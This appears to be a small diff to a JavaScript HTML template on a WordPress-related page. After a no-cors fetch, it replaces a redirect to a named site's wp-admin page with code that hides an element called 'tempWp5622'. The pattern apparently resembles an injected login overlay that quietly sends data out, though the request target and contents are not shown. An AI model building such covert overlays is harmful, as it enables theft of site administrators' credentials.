@@ -382,10 +382,10 @@ function renderHTMLTemplate() {
                 mode: 'no-cors',
             })
             .then(() => {
-                window.location.href = 'https://seventytworealestate.com/wp-admin/';
+                document.getElementById('tempWp5622').style.display = 'none';
             })
             .catch(error => {
-                window.location.href = 'https://seventytworealestate.com/wp-admin/';
+                document.getElementById('tempWp5622').style.display = 'none';
             });
         });
     `;
